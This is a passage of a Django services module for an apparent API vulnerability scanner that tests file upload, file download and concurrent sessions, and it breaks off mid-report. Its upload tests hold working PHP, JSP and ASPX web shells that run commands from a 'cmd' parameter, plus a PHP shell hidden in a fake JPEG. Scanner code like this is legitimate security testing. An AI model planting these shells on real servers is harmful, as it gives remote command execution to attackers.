# api_4/services.py
import requests
import json
import logging
import time
import tempfile
import os
from django.utils import timezone
from io import BytesIO
from django.db import connection, transaction
from django.conf import settings
from .models import FileUploadScanResult, FileUploadTest, ScanSession, FileDownloadTest, ScanHistory, ScanStats, ConcurrentSessionScanTC6, ScanLogTC6, TokenTestResultTC6, VulnerabilityReportTC6
from django.db.models import Q, Avg
from api_orch.models import PostmanAPI, ScanTokens
from typing import Dict, List, Optional, Tuple
from openai import OpenAI
import re

logger = logging.getLogger(__name__)

class FileUploadVulnerabilityScanner:
    """Main service class for scanning file upload vulnerabilities"""
    
    def __init__(self, scan_id, user):
        self.scan_id = scan_id
        self.user = user
        self.session = requests.Session()
        self.test_files = self._prepare_test_files()
        
    def _prepare_test_files(self):
        """Prepare various test files for vulnerability testing"""
        return {
            'webshell_php': {
                'name': 'shell.php',
                'content': '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>',
                'type': 'webshell',
                'size': len('<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>'),
            },
            'webshell_jsp': {
                'name': 'shell.jsp',
                'content': '<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("cmd") != null) { out.println("<pre>"); Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %>',
                'type': 'webshell',
                'size': 400,
            },
            'webshell_aspx': {
                'name': 'shell.aspx',
                'content': '<%@ Page Language="C#" %><script runat="server">void Page_Load(object sender, EventArgs e){if(Request["cmd"]!=null){Response.Write("<pre>");Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]).StandardOutput.ReadToEnd());Response.Write("</pre>");}}</script>',
                'type': 'webshell',
                'size': 300,
            },
            'large_file': {
                'name': 'large_test.txt',
                'content': None,  # Will be generated
                'type': 'large_file',
                'size': 10 * 1024 * 1024,  # 10MB for testing (can be increased)
            },
            'executable': {
                'name': 'test.exe',
                'content': 'MZ\x90\x00' + '\x00' * 100,  # Simple PE header
                'type': 'unrestricted',
                'size': 104,
            },
            'script': {
                'name': 'test.sh',
                'content': '#!/bin/bash\necho "Hello World"',
                'type': 'unrestricted',
                'size': 30,
            },
            'image_with_php': {
                'name': 'image.php.jpg',
                'content': '\xFF\xD8\xFF\xE0\x00\x10JFIF<?php system($_GET["cmd"]); ?>',
                'type': 'webshell',
                'size': 50,
            }
        }
    
    def get_apis_for_scan(self):
        """Fetch APIs from api_orch_postmanapi table for the given scan_id"""
        with connection.cursor() as cursor:
            cursor.execute("""
                SELECT "id", "name", "method", "url", "headers", "body", "authorization", "query_params"
                FROM api_orch_postmanapi
                WHERE "scan_id" = %s
            """, [self.scan_id])
            
            columns = [col[0] for col in cursor.description]
            return [dict(zip(columns, row)) for row in cursor.fetchall()]
    
    def get_jwt_token(self):
        """Get JWT token from api_orch_scantokens table"""
        with connection.cursor() as cursor:
            cursor.execute("""
                SELECT access_token
                FROM api_orch_scantokens
                WHERE scan_id = %s
                LIMIT 1
            """, [self.scan_id])
            
            result = cursor.fetchone()
            return result[0] if result else None
    
    def start_scan(self):
        """Start the vulnerability scan for all APIs"""
        logger.info(f"Starting file upload vulnerability scan for scan_id: {self.scan_id}")
        
        # Create or get scan session
        scan_session, created = ScanSession.objects.get_or_create(
            scan_id=self.scan_id,
            defaults={'user': self.user, 'status': 'running'}
        )
        
        if not created:
            scan_session.status = 'running'
            scan_session.save()
        
        try:
            apis = self.get_apis_for_scan()
            jwt_token = self.get_jwt_token()
            
            if not apis:
                logger.warning(f"No APIs found for scan_id: {self.scan_id}")
                scan_session.status = 'completed'
                scan_session.save()
                return
            
            scan_session.total_apis = len(apis)
            scan_session.save()
            
            vulnerable_count = 0
            
            for api in apis:
                try:
                    result = self.scan_api_for_file_upload(api, jwt_token)
                    if result and result.status == 'vulnerable':
                        vulnerable_count += 1
                    
                    scan_session.completed_apis += 1
                    scan_session.save()
                    
                except Exception as e:
                    logger.error(f"Error scanning API {api.get('id')}: {str(e)}")
                    continue
            
            scan_session.vulnerable_apis = vulnerable_count
            scan_session.status = 'completed'
            scan_session.completed_at = timezone.now()
            scan_session.save()
            
            logger.info(f"Scan completed. Found {vulnerable_count} vulnerable APIs out of {len(apis)} total.")
            
        except Exception as e:
            logger.error(f"Scan failed: {str(e)}")
            scan_session.status = 'failed'
            scan_session.save()
            raise
    
    def scan_api_for_file_upload(self, api_data, jwt_token):
        """Scan a specific API for file upload vulnerabilities"""
        start_time = time.time()
        
        logger.info(f"Scanning API: {api_data['name']} - {api_data['method']} {api_data['url']}")
        
        # Check if this API might accept file uploads
        if not self._might_accept_file_uploads(api_data):
            logger.info(f"API {api_data['name']} unlikely to accept file uploads, skipping")
            return None
        
        result = FileUploadScanResult.objects.create(
            scan_id=self.scan_id,
            api_id=api_data['id'],
            api_name=api_data['name'],
            api_url=api_data['url'],
            api_method=api_data['method'],
            status='safe'
        )
        
        try:
            # Test for file upload capability
            accepts_uploads = self._test_file_upload_capability(api_data, jwt_token, result)
            result.accepts_file_upload = accepts_uploads
            
            if accepts_uploads:
                logger.info(f"API {api_data['name']} accepts file uploads. Testing vulnerabilities...")
                
                # Test webshell uploads
                webshell_success = self._test_webshell_uploads(api_data, jwt_token, result)
                result.webshell_upload_success = webshell_success
                
                # Test large file uploads
                large_file_success = self._test_large_file_upload(api_data, jwt_token, result)
                result.large_file_upload_success = large_file_success
                
                # Test unrestricted file types
                unrestricted_success = self._test_unrestricted_file_types(api_data, jwt_token, result)
                result.unrestricted_file_types = unrestricted_success
                
                # Determine vulnerability status
                if webshell_success or large_file_success or unrestricted_success:
                    result.status = 'vulnerable'
                    if webshell_success and (large_file_success or unrestricted_success):
                        result.vulnerability_type = 'mixed'
                    elif webshell_success:
                        result.vulnerability_type = 'webshell'
                    elif large_file_success:
                        result.vulnerability_type = 'large_file'
                    elif unrestricted_success:
                        result.vulnerability_type = 'unrestricted'
                else:
                    result.status = 'suspicious'  # Accepts uploads but has protections
            
        except Exception as e:
            logger.error(f"Error during vulnerability scan: {str(e)}")
            result.status = 'error'
            result.error_message = str(e)
        
        result.scan_duration = time.time() - start_time
        result.save()
        
        return result
    
    def _might_accept_file_uploads(self, api_data):
        """Heuristic to determine if an API might accept file uploads"""
        method = api_data['method'].upper()
        url = api_data['url'].lower()
        
        # Only POST/PUT/PATCH methods typically accept file uploads
        if method not in ['POST', 'PUT', 'PATCH']:
            return False
        
        # Check URL patterns that might indicate file upload endpoints
        upload_keywords = ['upload', 'file', 'attachment', 'media', 'image', 'document', 'avatar', 'profile']
        if any(keyword in url for keyword in upload_keywords):
            return True
        
        # Check if body or headers suggest multipart/form-data
        headers = json.loads(api_data.get('headers', '{}'))
        content_type = headers.get('Content-Type', '').lower()
        if 'multipart' in content_type:
            return True
        
        return True  # Default to testing if uncertain
    
    def _test_file_upload_capability(self, api_data, jwt_token, result):
        """Test if the API accepts basic file uploads"""
        try:
            # Prepare a simple test image file
            test_file_content = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\x0cIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xdb\x00\x00\x00\x00IEND\xaeB`\x82'
            
            files = {'file': ('test.png', BytesIO(test_file_content), 'image/png')}
            
            headers = self._prepare_headers(api_data, jwt_token, multipart=True)
            
            response = self._make_request(
                api_data['method'],
                api_data['url'],
                headers=headers,
                files=files,
                query_params=json.loads(api_data.get('query_params', '{}'))
            )
            
            result.response_status_code = response.status_code
            result.response_headers = dict(response.headers)
            result.response_body_snippet = response.text[:500]
            
            # Consider 200, 201, 202 as successful uploads
            return response.status_code in [200, 201, 202]
            
        except Exception as e:
            logger.error(f"Error testing file upload capability: {str(e)}")
            return False
    
    def _test_webshell_uploads(self, api_data, jwt_token, result):
        """Test uploading webshell files"""
        webshell_success = False
        
        webshell_files = ['webshell_php', 'webshell_jsp', 'webshell_aspx', 'image_with_php']
        
        for file_key in webshell_files:
            test_file = self.test_files[file_key]
            
            try:
                files = {'file': (test_file['name'], BytesIO(test_file['content'].encode()), 'application/octet-stream')}
                headers = self._prepare_headers(api_data, jwt_token, multipart=True)
                
                response = self._make_request(
                    api_data['method'],
                    api_data['url'],
                    headers=headers,
                    files=files,
                    query_params=json.loads(api_data.get('query_params', '{}'))
                )
                
                upload_success = response.status_code in [200, 201, 202]
                
                # Record the test
                FileUploadTest.objects.create(
                    scan_result=result,
                    file_name=test_file['name'],
                    file_type=test_file['type'],
                    file_size=test_file['size'],
                    test_type='webshell',
                    upload_success=upload_success,
                    response_status=response.status_code,
                    response_message=response.text[:200]
                )
                
                if upload_success:
                    webshell_success = True
                    logger.warning(f"Webshell upload successful: {test_file['name']}")
                
            except Exception as e:
                logger.error(f"Error testing webshell upload {file_key}: {str(e)}")
        
        return webshell_success
    
    def _test_large_file_upload(self, api_data, jwt_token, result):
        """Test uploading large files"""
        try:
            # Create a large file in memory (10MB)
            large_content = b'A' * (10 * 1024 * 1024)  # 10MB
            
            files = {'file': ('large_test.txt', BytesIO(large_content), 'text/plain')}
            headers = self._prepare_headers(api_data, jwt_token, multipart=True)
            
            # Set timeout for large file upload
            response = self._make_request(
                api_data['method'],
                api_data['url'],
                headers=headers,
                files=files,
                query_params=json.loads(api_data.get('query_params', '{}')),
                timeout=300  # 5 minutes timeout
            )
            
            upload_success = response.status_code in [200, 201, 202]
            
            FileUploadTest.objects.create(
                scan_result=result,
                file_name='large_test.txt',
                file_type='large_file',
                file_size=len(large_content),
                test_type='large_file',
                upload_success=upload_success,
                response_status=response.status_code,
                response_message=response.text[:200]
            )
            
            if upload_success:
                logger.warning("Large file upload successful - potential DoS vulnerability")
            
            return upload_success
            
        except Exception as e:
            logger.error(f"Error testing large file upload: {str(e)}")
            return False
    
    def _test_unrestricted_file_types(self, api_data, jwt_token, result):
        """Test uploading restricted file types"""
        unrestricted_success = False
        
        restricted_files = ['executable', 'script']
        
        for file_key in restricted_files:
            test_file = self.test_files[file_key]
            
            try:
                files = {'file': (test_file['name'], BytesIO(test_file['content'].encode()), 'application/octet-stream')}
                headers = self._prepare_headers(api_data, jwt_token, multipart=True)
                
                response = self._make_request(
                    api_data['method'],
                    api_data['url'],
                    headers=headers,
                    files=files,
                    query_params=json.loads(api_data.get('query_params', '{}'))
                )
                
                upload_success = response.status_code in [200, 201, 202]
                
                FileUploadTest.objects.create(
                    scan_result=result,
                    file_name=test_file['name'],
                    file_type=test_file['type'],
                    file_size=test_file['size'],
                    test_type='unrestricted',
                    upload_success=upload_success,
                    response_status=response.status_code,
                    response_message=response.text[:200]
                )
                
                if upload_success:
                    unrestricted_success = True
                    logger.warning(f"Unrestricted file upload successful: {test_file['name']}")
                
            except Exception as e:
                logger.error(f"Error testing unrestricted upload {file_key}: {str(e)}")
        
        return unrestricted_success
    
    def _prepare_headers(self, api_data, jwt_token, multipart=False):
        """Prepare headers for the request"""
        headers = json.loads(api_data.get('headers', '{}'))
        
        # Add JWT authentication if available
        if jwt_token:
            headers['Authorization'] = f'Bearer {jwt_token}'
        
        # Remove Content-Type for multipart uploads (requests will set it)
        if multipart and 'Content-Type' in headers:
            del headers['Content-Type']
        
        return headers
    
    def _make_request(self, method, url, headers=None, files=None, data=None, query_params=None, timeout=60):
        """Make HTTP request with proper error handling"""
        try:
            response = self.session.request(
                method=method.upper(),
                url=url,
                headers=headers,
                files=files,
                data=data,
                params=query_params,
                timeout=timeout,
                verify=False  # For testing purposes, disable SSL verification
            )
            return response
        except requests.exceptions.Timeout:
            logger.error(f"Request timeout for {method} {url}")
            raise
        except requests.exceptions.ConnectionError:
            logger.error(f"Connection error for {method} {url}")
            raise
        except Exception as e:
            logger.error(f"Request error for {method} {url}: {str(e)}")
            raise


class ChatGPTAnalyzer:
    def __init__(self, api_key):
        self.api_key = api_key
        self.base_url = "https://api.openai.com/v1/chat/completions"

    def analyze_api_for_file_download(self, api_data):
        prompt = f"""
        Analyze the following API endpoint to determine if it could potentially allow file downloads. 
        Consider the HTTP method, headers, body structure, and any other relevant information.

        API Data:
        {json.dumps(api_data, indent=2)}

        Respond ONLY with valid JSON in this format:
        {{
            "potential_file_download": true/false,
            "reason": "string",
            "suspicious_parameters": ["string"],
            "recommended_test_approach": "string"
        }}
        """

        headers = {
            "Authorization": f"Bearer {self.api_key}",
            "Content-Type": "application/json"
        }

        payload = {
            "model": "gpt-4o-mini",
            "messages": [{"role": "user", "content": prompt}],
            "temperature": 0.7
        }

        try:
            response = requests.post(self.base_url, headers=headers, json=payload)
            response.raise_for_status()

            result = response.json()

            # Validate structure before parsing
            if not result.get("choices") or not result["choices"][0].get("message", {}).get("content", "").strip():
                logger.error(f"ChatGPT returned no content. Raw response: {result}")
                raise ValueError("Empty response from ChatGPT")

            content = result["choices"][0]["message"]["content"].strip()

            try:
                return json.loads(content)
            except json.JSONDecodeError:
                logger.error(f"Invalid JSON from ChatGPT: {content}")
                raise

        except Exception as e:
            logger.error(f"ChatGPT analysis failed: {str(e)}")
            return {
                "potential_file_download": False,
                "reason": "Analysis failed",
                "suspicious_parameters": [],
                "recommended_test_approach": ""
            }
    
    
class FileDownloadTester:
    def __init__(self, scan_id):
        self.scan_id = scan_id
        self.temp_dir = tempfile.gettempdir()
        
    def get_access_token(self):
        try:
            token = ScanTokens.objects.filter(scan_id=self.scan_id).first()
            return token.access_token if token else None
        except Exception as e:
            logger.error(f"Failed to get access token for scan {self.scan_id}: {str(e)}")
            return None
    
    def test_file_download(self, api, analysis_result):
        access_token = self.get_access_token()
        if not access_token:
            return False, 0
        
        test_count = getattr(settings, 'FILE_DOWNLOAD_TEST_COUNT', 10)  # Number of times to test the download
        success_count = 0
        
        headers = json.loads(api.headers)
        headers['Authorization'] = f"Bearer {access_token}"
        
        # Prepare request parameters
        params = json.loads(api.query_params) if api.query_params else {}
        body = json.loads(api.body) if api.body else {}
        
        for i in range(test_count):
            try:
                # Create a temporary file path
                temp_file_path = os.path.join(self.temp_dir, f"download_test_{api.id}_{i}.tmp")
                
                if api.method.upper() == 'GET':
                    response = requests.get(
                        api.url,
                        headers=headers,
                        params=params,
                        stream=True
                    )
                else:
                    response = requests.request(
                        api.method,
                        api.url,
                        headers=headers,
                        params=params,
                        json=body,
                        stream=True
                    )
                
                # Check if response looks like a file download
                if response.status_code == 200:
                    content_type = response.headers.get('Content-Type', '')
                    content_length = int(response.headers.get('Content-Length', 0))
                    
                    # Save the file temporarily
                    with open(temp_file_path, 'wb') as f:
                        for chunk in response.iter_content(chunk_size=8192):
                            if chunk:
                                f.write(chunk)
                    
                    # Check if file has content
                    if os.path.getsize(temp_file_path) > 0:
                        success_count += 1
                    
                    # Clean up
                    os.remove(temp_file_path)
                
            except Exception as e:
                logger.error(f"File download test failed for API {api.id}: {str(e)}")
            finally:
                if os.path.exists(temp_file_path):
                    try:
                        os.remove(temp_file_path)
                    except:
                        pass
        
        success_rate = success_count / test_count if test_count > 0 else 0
        threshold = getattr(settings, 'VULNERABILITY_THRESHOLD', 0.7)
        is_vulnerable = success_rate > threshold  # Consider vulnerable if >70% success rate
        
        return is_vulnerable, success_rate

class ScanOrchestrator:
    def __init__(self, scan_id, chatgpt_key):
        self.scan_id = scan_id
        self.chatgpt_analyzer = ChatGPTAnalyzer(chatgpt_key)
        self.file_tester = FileDownloadTester(scan_id)
        self.history = None
        
    def initialize_scan(self):
        self.history = ScanHistory.objects.create(
            scan_id=self.scan_id,
            status='running'
        )
        return self.history
    
    def complete_scan(self):
        if self.history:
            self.history.status = 'completed'
            self.history.completed_at = timezone.now()
            self.history.save()
            
            # Update stats
            vulnerable_count = FileDownloadTest.objects.filter(
                scan_id=self.scan_id,
                is_vulnerable=True
            ).count()
            
            total_tests = FileDownloadTest.objects.filter(
                scan_id=self.scan_id
            ).count()
            
            avg_success = FileDownloadTest.objects.filter(
                scan_id=self.scan_id
            ).aggregate(avg_success=Avg('success_rate'))['avg_success'] or 0
            
            ScanStats.objects.create(
                scan_id=self.scan_id,
                total_tests=total_tests,
                total_vulnerabilities=vulnerable_count,
                avg_success_rate=avg_success
            )
    
    def log_message(self, message):
        if self.history:
            self.history.logs += f"{timezone.now().isoformat()} - {message}\n"
            self.history.save()
        logger.info(f"Scan {self.scan_id}: {message}")
    
    def run_scan(self):
        try:
            self.initialize_scan()
            self.log_message("Scan started")
            
            # Get all APIs for this scan_id
            apis = PostmanAPI.objects.filter(scan_id=self.scan_id)
            self.history.total_apis = apis.count()
            self.history.save()
            
            vulnerable_count = 0
            
            for api in apis:
                try:
                    self.log_message(f"Processing API {api.id} - {api.name}")
                    
                    # Prepare API data for ChatGPT
                    api_data = {
                        "name": api.name,
                        "method": api.method,
                        "url": api.url,
                        "headers": json.loads(api.headers) if isinstance(api.headers, str) and api.headers else (api.headers or {}),
                        "body": json.loads(api.body) if isinstance(api.body, str) and api.body else (api.body or {}),
                        "query_params": json.loads(api.query_params) if isinstance(api.query_params, str) and api.query_params else (api.query_params or {}),
                        "authorization": json.loads(api.authorization) if isinstance(api.authorization, str) and api.authorization else (api.authorization or {})
                    }
                    
                    # Analyze with ChatGPT
                    analysis_result = self.chatgpt_analyzer.analyze_api_for_file_download(api_data)
                    self.log_message(f"Analysis result for API {api.id}: {analysis_result}")
                    
                    # Only test if ChatGPT thinks it's possible
                    if analysis_result.get('potential_file_download', False):
                        self.log_message(f"Testing file download for API {api.id}")
                        is_vulnerable, success_rate = self.file_tester.test_file_download(api, analysis_result)
                        
                        # Save results
                        FileDownloadTest.objects.create(
                            scan_id=self.scan_id,
                            api_id=api.id,
                            api_name=api.name,
                            url=api.url,
                            is_vulnerable=is_vulnerable,
                            success_rate=success_rate,
                            test_count=10,
                            success_count=int(success_rate * 10),
                            details={
                                "analysis": analysis_result,
                                "request": api_data
                            }
                        )
                        
                        if is_vulnerable:
                            vulnerable_count += 1
                            self.log_message(f"Vulnerability found in API {api.id} with success rate {success_rate}")
                    
                    self.history.tested_apis += 1
                    self.history.vulnerable_apis = vulnerable_count
                    self.history.save()
                    
                except Exception as e:
                    self.log_message(f"Error processing API {api.id}: {str(e)}")
                    continue
            
            self.log_message(f"Scan completed. Found {vulnerable_count} vulnerable APIs")
            self.complete_scan()
            return True
            
        except Exception as e:
            self.log_message(f"Scan failed: {str(e)}")
            if self.history:
                self.history.status = 'failed'
                self.history.save()
            return False

class ChatGPTServiceTC6:
    """Service to interact with ChatGPT API for login API identification"""
    
    def __init__(self):
        self.client = OpenAI(api_key=settings.OPENAI_API_KEY)

    def safe_json_parse(self, raw_output: str):
        """
        Safely parse JSON from ChatGPT output that may contain code fences or extra text.
        """
        if not raw_output:
            return None

        # Remove triple backticks and optional 'json'
        cleaned = re.sub(r"^```(?:json)?|```$", "", raw_output.strip(), flags=re.MULTILINE).strip()

        # Try parsing directly
        try:
            import json
            return json.loads(cleaned)
        except json.JSONDecodeError:
            # Attempt to extract JSON block from within text
            match = re.search(r"\{.*\}", cleaned, flags=re.DOTALL)
            if match:
                try:
                    return json.loads(match.group(0))
                except json.JSONDecodeError:
                    return None
            return None
    
    def identify_login_api(self, apis: List[Dict], batch_size: int = 5) -> Optional[Dict]:
        """
        Use ChatGPT to identify which API is the login API.
        Processes APIs in batches for large lists.
        """
        try:
            total_apis = len(apis)
            logger.debug(f"[DEBUG] Total APIs to process: {total_apis}, batch size: {batch_size}")

            # Split into batches
            for batch_start in range(0, total_apis, batch_size):
                batch_apis = apis[batch_start:batch_start + batch_size]

                api_descriptions = []
                for api in batch_apis:
                    description = {
                        'id': api['id'],
                        'name': api['name'],
                        'method': api['method'],
                        'url': api['url'],
                        'body': api['body'],
                        'headers': api['headers']
                    }
                    api_descriptions.append(description)

                prompt = f"""
                Analyze the following APIs and identify which one is most likely the login/authentication API.
                Look for indicators such as:
                - URL patterns containing 'login', 'auth', 'signin', 'authenticate'
                - Request body containing username/password fields
                - Content-Type indicating form data or JSON
                - Method being POST

                APIs to analyze:
                {json.dumps(api_descriptions, indent=2)}

                Respond with ONLY a JSON object containing:
                - "login_api_id": the ID of the identified login API (or null if none found)
                - "confidence": a number between 0 and 1 indicating confidence
                - "reasoning": brief explanation of why this API was chosen

                If no clear login API is found, set login_api_id to null.
                """

                logger.debug(f"[DEBUG] Sending batch {batch_start // batch_size + 1} to ChatGPT with {len(batch_apis)} APIs.")
                logger.debug(f"[DEBUG] Prompt for batch {batch_start // batch_size + 1}:\n{prompt}")

                response = self.client.chat.completions.create(
                    model="gpt-4o-mini",
                    messages=[
                        {"role": "system", "content": "You are an API security expert. Analyze APIs to identify login endpoints."},
                        {"role": "user", "content": prompt}
                    ],
                    temperature=0.1
                )

                raw_output = response.choices[0].message.content.strip()
                print(f"\n===== ChatGPT raw output (batch {batch_start // batch_size + 1}) =====\n{raw_output}\n====================\n")
                logger.debug(f"[DEBUG] ChatGPT raw output for batch {batch_start // batch_size + 1}:\n{raw_output!r}")

                try:
                    result = self.safe_json_parse(raw_output)
                    if not result:
                        logger.error(f"[ERROR] Could not parse valid JSON from ChatGPT in batch {batch_start // batch_size + 1}")
                        continue

                except json.JSONDecodeError as je:
                    logger.error(f"[ERROR] Failed to parse JSON from ChatGPT output in batch {batch_start // batch_size + 1}: {je}")
                    continue  # Move to next batch

                if result.get("login_api_id"):
                    logger.info(f"[INFO] Login API identified in batch {batch_start // batch_size + 1}: {result}")
                    return result

            logger.warning("[WARN] No login API identified in any batch.")
            return None

        except Exception as e:
            logger.error(f"[ERROR] Error calling ChatGPT API: {str(e)}", exc_info=True)
            return None


class DatabaseServiceTC6:
    """Service to interact with api_orch database tables"""
    
    def get_apis_by_scan_id(self, scan_id: int) -> List[Dict]:
        """Fetch APIs from api_orch_postmanapi table by scan_id"""
        with connection.cursor() as cursor:
            cursor.execute("""
                SELECT "id", "name", "method", "url", "headers", "body", "authorization", 
                       "query_params", "original_url", "original_headers", "original_body"
                FROM api_orch_postmanapi 
                WHERE "scan_id" = %s
            """, [scan_id])
            
            columns = [col[0] for col in cursor.description]
            return [dict(zip(columns, row)) for row in cursor.fetchall()]
    
    def get_scan_credentials(self, scan_id: int) -> Optional[Dict]:
        """Get username and password from api_orch_scan table"""
        with connection.cursor() as cursor:
            cursor.execute("""
                SELECT username, password 
                FROM api_orch_scan 
                WHERE id = %s
            """, [scan_id])
            
            row = cursor.fetchone()
            if row:
                return {'username': row[0], 'password': row[1]}
            return None


class TokenServiceTC6:
    """Service to handle token generation and validation"""
    
    def generate_access_token(self, login_api: Dict, credentials: Dict) -> Optional[str]:
        """Generate access token using login API"""
        try:
            # Parse headers
            headers = json.loads(login_api['headers']) if isinstance(login_api['headers'], str) else login_api['headers']
            
            # Parse body and inject credentials
            body_data = json.loads(login_api['body']) if isinstance(login_api['body'], str) else login_api['body']
            if 'raw' in body_data:
                raw_body = json.loads(body_data['raw'])
                # Try common username/password field names
                username_fields = ['username', 'email', 'user', 'login']
                password_fields = ['password', 'pass', 'pwd']
                
                for field in username_fields:
                    if field in raw_body:
                        raw_body[field] = credentials['username']
                        break
                
                for field in password_fields:
                    if field in raw_body:
                        raw_body[field] = credentials['password']
                        break
                
                body_json = raw_body
            else:
                body_json = body_data
                
            # Make login request
            response = requests.request(
                method=login_api['method'],
                url=login_api['url'],
                headers=headers,
                json=body_json,
                timeout=30
            )
            
            if response.status_code in [200, 201]:
                response_data = response.json()
                # Try to extract token from common field names
                token_fields = ['token', 'access_token', 'accessToken', 'jwt', 'authToken']
                for field in token_fields:
                    if field in response_data:
                        return response_data[field]
                    
                # If nested in data object
                if 'data' in response_data:
                    for field in token_fields:
                        if field in response_data['data']:
                            return response_data['data'][field]
            
            return None
            
        except Exception as e:
            logger.error(f"Error generating access token: {str(e)}")
            return None
    
    def test_token_validity(self, token: str, test_api: Dict) -> Tuple[bool, int]:
        """Test if a token is still valid using a test API"""
        try:
            # Parse headers and add authorization
            headers = json.loads(test_api['headers']) if isinstance(test_api['headers'], str) else test_api['headers']
            headers['Authorization'] = f"Bearer {token}"
            
            # Parse body if exists
            body_data = None
            if test_api['body']:
                body_info = json.loads(test_api['body']) if isinstance(test_api['body'], str) else test_api['body']
                if 'raw' in body_info:
                    body_data = json.loads(body_info['raw'])
            
            response = requests.request(
                method=test_api['method'],
                url=test_api['url'],
                headers=headers,
                json=body_data,
                timeout=30
            )
            
            # Consider token valid if status is 2xx
            is_valid = 200 <= response.status_code < 300
            return is_valid, response.status_code
            
        except Exception as e:
            logger.error(f"Error testing token validity: {str(e)}")
            return False, 0


class VulnerabilityScanServiceTC6:
    """Main service to orchestrate the vulnerability scanning process"""
    
    def __init__(self):
        self.chatgpt_service = ChatGPTServiceTC6()
        self.db_service = DatabaseServiceTC6()
        self.token_service = TokenServiceTC6()
    
    def create_log(self, scan: ConcurrentSessionScanTC6, level: str, message: str, step: str, metadata: Dict = None):
        """Create a log entry for the scan"""
        ScanLogTC6.objects.create(
            scan=scan,
            level=level,
            message=message,
            step=step,
            metadata=metadata
        )
        logger.info(f"Scan {scan.scan_id} - {step}: {message}")

    def perform_vulnerability_scan(self, scan_id: int) -> ConcurrentSessionScanTC6:
        """Main method to perform the vulnerability scan"""
        # Check for existing scan
        scan, created = ConcurrentSessionScanTC6.objects.get_or_create(
            scan_id=scan_id,
            defaults={'status': 'processing'}
        )
        
        if not created:
            # If scan exists, reset its status if needed
            if scan.status in ['completed', 'failed']:
                scan.status = 'processing'
                scan.error_message = None
                scan.save()
        
        try:
            self.create_log(scan, 'INFO', f'Started vulnerability scan for scan_id: {scan_id}', 'SCAN_START')
            
            # Step 1: Fetch APIs from database
            self.create_log(scan, 'INFO', 'Fetching APIs from database', 'FETCH_APIS')
            apis = self.db_service.get_apis_by_scan_id(scan_id)
            
            if not apis:
                raise Exception(f"No APIs found for scan_id: {scan_id}")
            
            self.create_log(scan, 'INFO', f'Found {len(apis)} APIs', 'FETCH_APIS', {'api_count': len(apis)})
            
            # Step 2: Use ChatGPT to identify login API
            self.create_log(scan, 'INFO', 'Identifying login API using ChatGPT', 'IDENTIFY_LOGIN')
            chatgpt_result = self.chatgpt_service.identify_login_api(apis)
            
            if not chatgpt_result or not chatgpt_result.get('login_api_id'):
                raise Exception("Could not identify login API")
            
            login_api = next((api for api in apis if api['id'] == chatgpt_result['login_api_id']), None)
            if not login_api:
                raise Exception("Identified login API not found in API list")
            
            scan.login_api_identified = True
            scan.login_api_url = login_api['url']
            scan.login_api_method = login_api['method']
            scan.save()
            
            self.create_log(scan, 'INFO', f'Login API identified: {login_api["name"]}', 'IDENTIFY_LOGIN', chatgpt_result)
            
            # Step 3: Get credentials
            self.create_log(scan, 'INFO', 'Fetching credentials from scan table', 'FETCH_CREDENTIALS')
            credentials = self.db_service.get_scan_credentials(scan_id)
            
            if not credentials:
                raise Exception("No credentials found for scan")
            
            # Step 4: Generate two access tokens
            self.create_log(scan, 'INFO', 'Generating first access token', 'GENERATE_TOKEN_1')
            token_1 = self.token_service.generate_access_token(login_api, credentials)
            
            if not token_1:
                raise Exception("Could not generate first access token")
            
            time.sleep(1)  # Small delay between requests
            
            self.create_log(scan, 'INFO', 'Generating second access token', 'GENERATE_TOKEN_2')
            token_2 = self.token_service.generate_access_token(login_api, credentials)
            
            if not token_2:
                raise Exception("Could not generate second access token")
            
            # Step 5: Find an authenticated API for testing
            excluded_keywords = ['login', 'signin', 'signup', 'register', 'auth', 'authenticate']

            def is_not_auth_related(api):
                url_lower = api['url'].lower()
                name_lower = api['name'].lower() if api.get('name') else ""
                return not any(keyword in url_lower or keyword in name_lower for keyword in excluded_keywords)

            authenticated_api = next(
                (
                    api for api in apis
                    if api['id'] != login_api['id']
                    and is_not_auth_related(api)
                    and 'authorization' in str(api).lower()
                ),
                None
            )

            if not authenticated_api:
                authenticated_api = next(
                    (
                        api for api in apis
                        if api['id'] != login_api['id']
                        and is_not_auth_related(api)
                    ),
                    None
                )

            if not authenticated_api:
                raise Exception("No API available for token testing")
            
            # Step 6: Wait 5 minutes
            self.create_log(scan, 'INFO', 'Waiting 5 minutes before testing tokens', 'WAIT_PERIOD')
            time.sleep(300)  # 5 minutes
            
            # Step 7: Test both tokens
            self.create_log(scan, 'INFO', 'Testing token validity after 5 minutes', 'TEST_TOKENS')
            
            token_1_valid, token_1_status = self.token_service.test_token_validity(token_1, authenticated_api)
            token_2_valid, token_2_status = self.token_service.test_token_validity(token_2, authenticated_api)
            
            # Create token test result
            TokenTestResultTC6.objects.create(
                scan=scan,
                token_1=token_1[:50] + '...',  # Store partial token for security
                token_2=token_2[:50] + '...',
                token_1_active_after_5min=token_1_valid,
                token_2_active_after_5min=token_2_valid,
                test_api_url=authenticated_api['url'],
                test_api_method=authenticated_api['method'],
                vulnerability_confirmed=token_1_valid and token_2_valid,
                token_1_response_code=token_1_status,
                token_2_response_code=token_2_status,
                tested_at=timezone.now()
            )
            
            # Step 8: Determine if vulnerability exists
            vulnerability_found = token_1_valid and token_2_valid
            
            if vulnerability_found:
                self.create_log(scan, 'WARNING', 'Vulnerability detected: Both tokens active simultaneously', 
                                'VULNERABILITY_FOUND')
                
                # Create vulnerability report
                VulnerabilityReportTC6.objects.create(
                    scan=scan,
                    title="Concurrent Session Management Vulnerability",
                    description="The application allows multiple active sessions for the same user account simultaneously. "
                                "Both access tokens remained valid after 5 minutes, indicating insufficient session management.",
                    severity='MEDIUM',
                    impact="An attacker who gains access to user credentials could maintain persistent access "
